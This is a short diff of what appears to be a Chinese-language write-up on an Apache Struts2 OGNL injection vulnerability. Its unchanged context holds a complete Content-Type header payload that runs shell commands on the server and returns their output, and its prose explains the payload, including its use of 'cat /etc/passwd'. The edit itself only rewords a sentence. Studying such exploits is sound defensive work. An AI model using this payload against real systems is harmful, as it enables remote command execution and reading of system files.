@@ -406,7 +406,7 @@ protected String buildErrorMessage(Throwable e, Object[] args)
 header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
 ```
 
-通过#nike='multipart/form-data'语句使得后台判断语句content_type.contains("multipart/form-data")判断结果为true，以便攻击代码得以传入。同时将攻击代码'cat /etc/passwd'赋值给#cmd参数。接下来通过(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})来判断目标主机的操作系统类型，并选择性的进行指令赋值，最终，通过如下图代码，将攻击指令执行
+通过#nike='multipart/form-data'语句使得后台判断语句content_type.contains("multipart/form-data")判断结果为true，以便攻击代码得以传入。同时将攻击代码'cat /etc/passwd'赋值给#cmd参数。接下来通过(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})来判断目标主机的操作系统类型，并选择性的进行指令赋值，最终将攻击指令执行
 
 **批量检测POC执行效果**
 
